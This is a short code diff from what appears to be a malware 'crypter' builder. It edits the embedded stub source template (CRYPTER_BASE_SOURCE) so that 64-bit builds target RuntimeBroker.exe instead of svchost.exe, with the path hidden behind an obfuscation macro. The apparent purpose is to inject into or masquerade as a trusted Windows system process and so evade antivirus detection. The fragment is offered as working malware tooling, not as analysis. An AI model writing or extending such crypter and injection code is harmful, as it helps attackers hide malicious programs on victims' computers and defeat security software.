@@ -73,9 +73,9 @@ const char* CRYPTER_BASE_SOURCE =
 
 //"wchar_t upath[MAX_PATH];\n"
 //"GetRandomProcessPathW(upath);\n"
-
+ 
 "#ifdef _WIN64\n"
-"auto path = MP_OB(L\"%%WINDIR%%\\\\System32\\\\svchost.exe\");\n"
+"auto path = MP_OB(L\"%%WINDIR%%\\\\System32\\\\RuntimeBroker.exe\");\n"
 "#else\n"
 "auto path = MP_OB(L\"%%WINDIR%%\\\\SysWOW64\\\\svchost.exe\");\n"
 "#endif\n"
